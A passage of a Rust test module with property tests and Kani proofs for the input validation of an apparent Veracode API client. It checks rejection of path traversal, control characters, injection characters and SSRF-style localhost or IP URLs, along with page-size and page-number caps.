        ]
    }

    proptest! {
        #![proptest_config(ProptestConfig {
            cases: if cfg!(miri) { 5 } else { 1000 },
            failure_persistence: None,
            .. ProptestConfig::default()
        })]

        // Property: Valid UUIDs are always accepted
        #[test]
        fn prop_valid_uuids_accepted(uuid in valid_uuid_strategy()) {
            let result = AppGuid::new(&uuid);
            prop_assert!(result.is_ok(), "Valid UUID should be accepted: {}", uuid);
        }

        // Property: Path traversal in GUID is always rejected
        #[test]
        fn prop_guid_rejects_path_traversal(
            traversal in path_traversal_strategy(),
            valid_uuid in valid_uuid_strategy()
        ) {
            // Try path traversal embedded in UUID
            let combined = format!("{}{}", valid_uuid, traversal);
            prop_assert!(AppGuid::new(&combined).is_err());

            // Also verify that traversal strings are rejected
            let result = AppGuid::new(&traversal);
            prop_assert!(result.is_err(), "Path traversal should be rejected: {}", traversal);
        }

        // Property: Empty strings are rejected for GUIDs
        #[test]
        fn prop_guid_rejects_empty(whitespace in r"\s*") {
            prop_assert!(AppGuid::new(whitespace).is_err());
        }

        // Property: Oversized GUIDs are rejected
        #[test]
        fn prop_guid_rejects_oversized(extra_chars in 1..=100usize) {
            let long_string = "a".repeat(MAX_GUID_LEN.saturating_add(extra_chars));
            prop_assert!(AppGuid::new(long_string).is_err());
        }

        // Property: AppName trims whitespace correctly
        #[test]
        fn prop_appname_trims_whitespace(
            name in "[a-zA-Z0-9 ]{1,100}",
            leading in r"\s{0,10}",
            trailing in r"\s{0,10}"
        ) {
            let input = format!("{}{}{}", leading, name, trailing);
            if let Ok(app_name) = AppName::new(&input) {
                let trimmed = name.trim();
                prop_assert_eq!(app_name.as_str(), trimmed);
                prop_assert!(!app_name.as_str().starts_with(' '));
                prop_assert!(!app_name.as_str().ends_with(' '));
            }
        }

        // Property: AppName rejects path traversal
        #[test]
        fn prop_appname_rejects_path_traversal(traversal in path_traversal_strategy()) {
            prop_assert!(AppName::new(traversal).is_err());
        }

        // Property: AppName rejects control characters (except those that trim away)
        #[test]
        fn prop_appname_rejects_control_chars(
            prefix in "[a-zA-Z]{1,10}",
            suffix in "[a-zA-Z]{1,10}",
            control_char in 0x00u8..0x20u8
        ) {
            // Put control char in the middle so it won't be trimmed
            let input = format!("{}{}{}", prefix, char::from(control_char), suffix);
            let trimmed = input.trim();

            // If the control char survives trimming, it should be rejected
            if trimmed.chars().any(|c| c.is_control()) {
                prop_assert!(AppName::new(&input).is_err());
            }
        }

        // Property: AppName enforces length bounds
        #[test]
        fn prop_appname_enforces_length(extra in 1..=100usize) {
            let too_long = "a".repeat(MAX_APP_NAME_LEN.saturating_add(extra));
            prop_assert!(AppName::new(too_long).is_err());
        }

        // Property: Description rejects null bytes
        #[test]
        fn prop_description_rejects_null_bytes(
            prefix in "[a-zA-Z0-9 ]{0,100}",
            suffix in "[a-zA-Z0-9 ]{0,100}"
        ) {
            let with_null = format!("{}\0{}", prefix, suffix);
            prop_assert!(Description::new(with_null).is_err());
        }

        // Property: Description enforces length bounds
        #[test]
        fn prop_description_enforces_length(extra in 1..=1000usize) {
            let too_long = "a".repeat(MAX_DESCRIPTION_LEN.saturating_add(extra));
            prop_assert!(Description::new(too_long).is_err());
        }

        // Property: validate_url_segment rejects path traversal
        #[test]
        fn prop_url_segment_rejects_traversal(traversal in path_traversal_strategy()) {
            prop_assert!(validate_url_segment(&traversal, 1000).is_err());
        }

        // Property: validate_url_segment rejects control characters
        #[test]
        fn prop_url_segment_rejects_control_chars(
            prefix in "[a-zA-Z]{1,10}",
            control_char in 0x00u8..0x20u8
        ) {
            let input = format!("{}{}", prefix, char::from(control_char));
            prop_assert!(validate_url_segment(&input, 1000).is_err());
        }

        // Property: validate_url_segment enforces max_len
        #[test]
        fn prop_url_segment_enforces_max_len(
            segment in "[a-zA-Z0-9_-]{50,100}",
            max_len in 1..50usize
        ) {
            if segment.len() > max_len {
                prop_assert!(validate_url_segment(&segment, max_len).is_err());
            }
        }

        // Property: validate_page_size returns default for None
        #[test]
        fn prop_page_size_default_on_none(_unit in prop::bool::ANY) {
            prop_assert_eq!(validate_page_size(None).expect("Should return default page size"), DEFAULT_PAGE_SIZE);
        }

        // Property: validate_page_size rejects zero
        #[test]
        fn prop_page_size_rejects_zero(_unit in prop::bool::ANY) {
            prop_assert!(validate_page_size(Some(0)).is_err());
        }

        // Property: validate_page_size caps at maximum
        #[test]
        fn prop_page_size_caps_at_max(size in (MAX_PAGE_SIZE + 1)..=u32::MAX) {
            let result = validate_page_size(Some(size)).expect("Should cap at max page size");
            prop_assert_eq!(result, MAX_PAGE_SIZE);
            prop_assert!(result <= MAX_PAGE_SIZE);
        }

        // Property: validate_page_size accepts valid range
        #[test]
        fn prop_page_size_accepts_valid(size in 1..=MAX_PAGE_SIZE) {
            let result = validate_page_size(Some(size)).expect("Valid page size should be accepted");
            prop_assert_eq!(result, size);
        }

        // Property: validate_page_number returns None for None
        #[test]
        fn prop_page_number_none_on_none(_unit in prop::bool::ANY) {
            prop_assert_eq!(validate_page_number(None).expect("Should return None for None input"), None);
        }

        // Property: validate_page_number caps at maximum
        #[test]
        fn prop_page_number_caps_at_max(page in (MAX_PAGE_NUMBER + 1)..=u32::MAX) {
            let result = validate_page_number(Some(page)).expect("Should cap at max page number");
            prop_assert_eq!(result, Some(MAX_PAGE_NUMBER));
        }

        // Property: validate_page_number accepts valid range
        #[test]
        fn prop_page_number_accepts_valid(page in 0..=MAX_PAGE_NUMBER) {
            let result = validate_page_number(Some(page)).expect("Valid page number should be accepted");
            prop_assert_eq!(result, Some(page));
        }

        // Property: encode_query_param neutralizes injection characters
        #[test]
        fn prop_encode_neutralizes_injection(value in ".*") {
            let encoded = encode_query_param(&value);

            // Dangerous characters should be encoded
            if value.contains('&') {
                prop_assert!(encoded.contains("%26"), "& should be encoded to %26");
            }
            if value.contains('=') {
                prop_assert!(encoded.contains("%3D"), "= should be encoded to %3D");
            }
            if value.contains(';') {
                prop_assert!(encoded.contains("%3B"), "; should be encoded to %3B");
            }
            if value.contains('?') {
                prop_assert!(encoded.contains("%3F"), "? should be encoded to %3F");
            }
        }

        // Property: encode_query_param is idempotent (encoding twice is safe)
        #[test]
        fn prop_encode_is_idempotent(value in ".*") {
            let encoded_once = encode_query_param(&value);
            let encoded_twice = encode_query_param(&encoded_once);
            // The second encoding should escape the % signs from first encoding
            prop_assert!(encoded_twice.contains("%25") || encoded_once == encoded_twice);
        }

        // Property: build_query_param properly encodes values
        #[test]
        fn prop_build_query_param_encodes(
            key in "[a-zA-Z_][a-zA-Z0-9_]{0,20}",
            value in ".*"
        ) {
            let (result_key, result_value) = build_query_param(&key, &value);
            prop_assert_eq!(result_key, key);
            prop_assert_eq!(result_value, encode_query_param(&value));
        }

        // Property: validate_veracode_url rejects non-HTTPS
        #[test]
        fn prop_veracode_url_rejects_http(
            subdomain in "[a-z]{3,10}",
            tld in prop::sample::select(vec!["com", "eu", "us"])
        ) {
            let url = format!("http://{}.veracode.{}/path", subdomain, tld);
            prop_assert!(validate_veracode_url(&url).is_err());
        }

        // Property: validate_veracode_url rejects non-veracode domains
        #[test]
        fn prop_veracode_url_rejects_wrong_domain(
            domain in "[a-z]{5,15}",
            tld in "[a-z]{2,3}"
        ) {
            // Skip if accidentally generated a valid veracode domain
            prop_assume!(domain != "veracode");

            let url = format!("https://{}.{}/path", domain, tld);
            prop_assert!(validate_veracode_url(&url).is_err());
        }

        // Property: validate_veracode_url accepts valid domains
        #[test]
        fn prop_veracode_url_accepts_valid(
            subdomain in "[a-z]{3,10}",
            tld in prop::sample::select(vec!["com", "eu", "us"]),
            path in "[a-z0-9/_-]{0,50}"
        ) {
            let url = format!("https://{}.veracode.{}/{}", subdomain, tld, path);
            prop_assert!(validate_veracode_url(&url).is_ok());
        }

        // Property: validate_veracode_url blocks localhost SSRF
        #[test]
        fn prop_veracode_url_blocks_localhost(
            port in 1..=65535u16,
            path in "[a-z0-9/_-]{0,20}"
        ) {
            let url = format!("https://localhost:{}/{}", port, path);
            prop_assert!(validate_veracode_url(&url).is_err());
        }

        // Property: validate_veracode_url blocks IP address SSRF
        #[test]
        fn prop_veracode_url_blocks_ip_addresses(
            a in 0..=255u8,
            b in 0..=255u8,
            c in 0..=255u8,
            d in 0..=255u8
        ) {
            let url = format!("https://{}.{}.{}.{}/path", a, b, c, d);
            prop_assert!(validate_veracode_url(&url).is_err());
        }

        // Property: validate_scan_id rejects empty strings
        #[test]
        fn prop_scan_id_rejects_empty(_unit in prop::bool::ANY) {
            prop_assert!(validate_scan_id("").is_err());
        }

        // Property: validate_scan_id enforces length bounds
        #[test]
        fn prop_scan_id_enforces_length(extra in 1..=100usize) {
            let too_long = "a".repeat(MAX_SCAN_ID_LEN.saturating_add(extra));
            prop_assert!(validate_scan_id(&too_long).is_err());
        }

        // Property: validate_scan_id rejects path traversal
        #[test]
        fn prop_scan_id_rejects_traversal(traversal in path_traversal_strategy()) {
            prop_assert!(validate_scan_id(&traversal).is_err());
        }

        // Property: validate_scan_id accepts only alphanumeric, hyphen, underscore
        #[test]
        fn prop_scan_id_accepts_valid_chars(
            scan_id in "[a-zA-Z0-9_-]{1,128}"
        ) {
            prop_assert!(validate_scan_id(&scan_id).is_ok());
        }

        // Property: validate_scan_id rejects special characters
        #[test]
        fn prop_scan_id_rejects_special_chars(
            special_char in prop::sample::select(vec!['?', '&', '=', ';', '/', '\\', '.', ' ', '@', '#', '%'])
        ) {
            let invalid_id = format!("scan{}id", special_char);
            prop_assert!(validate_scan_id(&invalid_id).is_err());
        }

        // Property: Injection attempts in scan_id are always rejected
        #[test]
        fn prop_scan_id_rejects_injection(injection in injection_strategy()) {
            prop_assert!(validate_scan_id(&injection).is_err());
        }
    }
}

// Kani formal verification harnesses for critical security properties
#[cfg(kani)]
mod kani_proofs {
    use super::*;

    // NOTE: String-based Kani proofs removed due to excessive memory consumption.
    // Even with bounded byte arrays (256 bytes), these proofs cause OOM kills
    // because CBMC must explore exponential state space for string operations.
    //
    // These security properties are thoroughly tested via:
    // - proptest: 100s of random test cases with shrinking
    // - miri: undefined behavior detection on all proptest cases
    // - unit tests: concrete test cases for specific attack vectors
    //
    // The numeric proofs below verify efficiently and provide formal guarantees.

    /// Verifies that validate_page_size caps values at MAX_PAGE_SIZE.
    ///
    /// This proof formally verifies DoS protection by ensuring that
    /// no page size can exceed the maximum allowed value.
    #[kani::proof]
    fn verify_page_size_caps_at_maximum() {
        let size: u32 = kani::any();

        let result = validate_page_size(Some(size));

        // The result must never exceed MAX_PAGE_SIZE
        if let Ok(validated_size) = result {
            assert!(
                validated_size <= MAX_PAGE_SIZE,
                "Page size must be capped at maximum"
            );
        }
    }

    /// Verifies that validate_page_size rejects zero.
    ///
    /// This proof formally verifies that zero page sizes are always rejected,
    /// preventing division by zero and infinite loop attacks.
    #[kani::proof]
    fn verify_page_size_rejects_zero() {
        let result = validate_page_size(Some(0));
        assert!(result.is_err(), "Zero page size must be rejected");
    }

    /// Verifies that validate_page_number caps values at MAX_PAGE_NUMBER.
    ///
    /// This proof formally verifies DoS protection by ensuring that
    /// no page number can exceed the maximum allowed value.
    #[kani::proof]
    fn verify_page_number_caps_at_maximum() {
        let page: u32 = kani::any();

        let result = validate_page_number(Some(page));

        // The result must never exceed MAX_PAGE_NUMBER
        if let Ok(Some(validated_page)) = result {
            assert!(
                validated_page <= MAX_PAGE_NUMBER,
                "Page number must be capped at maximum"
            );
        }
    }
}
